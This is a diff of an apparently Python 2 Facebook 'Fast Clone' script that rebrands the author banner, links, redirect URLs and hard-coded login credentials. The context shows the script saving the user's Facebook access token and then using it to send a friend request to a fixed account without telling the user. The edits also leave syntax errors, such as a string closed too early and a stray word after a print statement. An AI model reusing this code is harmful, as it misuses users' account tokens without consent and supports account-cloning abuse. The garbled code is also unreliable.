@@ -47,20 +47,20 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """ -----------------------------•◈•
-(  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
-\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
-\033[1;91m======================================="""
+logo = """ 
+
+\033[1;91m╱╱╭┳━━━┳━╮╱╭┳╮╱╭╮
+\033[1;91m╱╱┃┃╭━╮┃┃╰╮┃┃┃╱┃┃
+\033[1;96m╱╱┃┃┃╱┃┃╭╮╰╯┃┃╱┃┃
+\033[1;96m╭╮┃┃╰━╯┃┃╰╮┃┃┃╱┃┃
+\033[1;91m┃╰╯┃╭━╮┃┃╱┃┃┃╰━╯┃
+\033[1;91m╰━━┻╯╱╰┻╯╱╰━┻━━━╯
+\033[1;96m《《《《《《《《《《《《《《《《《《《《《《《🔥
+\033[1;96mAuthor  \033[1;93m: \033[1;96mIͥᴋⷦrͬaͣmͫ S͛ᴛⷮuͧdͩiͥoͦ
+\033[1;96mYouTube \033[1;93m: \033[1;ｴƙɾα𝓶 S𝜏ᥙԃισ🔥
+\033[1;96mFacebook  \033[1;93m: \033[1; ᓰⲕᖇᎯⲙ ᗩⲕᑲᎯᖇ
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Janu/JNu
+\033[1;91m》》》》》》》》》》》》》》》》》》》🔥"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -79,16 +79,16 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\033[1;96m ============================================================="
-print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
+print  """\033[1;91m》》》》》》》》》》》》》》》》》》》"""
+\033[1;91mAuthor  \033[1;93m: \033[1;96mIͥᴋⷦrͬaͣmͫ S͛ᴛⷮuͧdͩiͥoͦ🔥
+\033[1;92mYouTube \033[1;93m: \033[1;92mIkram_Studio
+\033[1;96mFacebook  \033[1;93m: \033[1;92m Ikram Akbar
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Janu/janu
+\033[1;91m《《《《《《《《《《《《《《《《《《《《《《《《《《🔥"""
+print " \x1b[1;93m》》》》》》》》》》》》》》》》》》》》》》》》》》》》》Fast Clone🔥"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "janu"
+CorrectPassword = "janu"
 
 loop = 'true'
 while (loop == 'true'):
@@ -100,10 +100,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.youtube.com/channel/UC2X4F2qRcrYBJH9aDA5cOcQ')
     else:
-        print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        print "Wrong Username"Youtube
+        os.system('xdg-open https://www.youtube.com/channel/UC2X4F2qRcrYBJH9aDA5cOcQ')
 
 def login():
 	os.system('clear')
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.youtube.com/channel/UC2X4F2qRcrYBJH9aDA5cOcQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
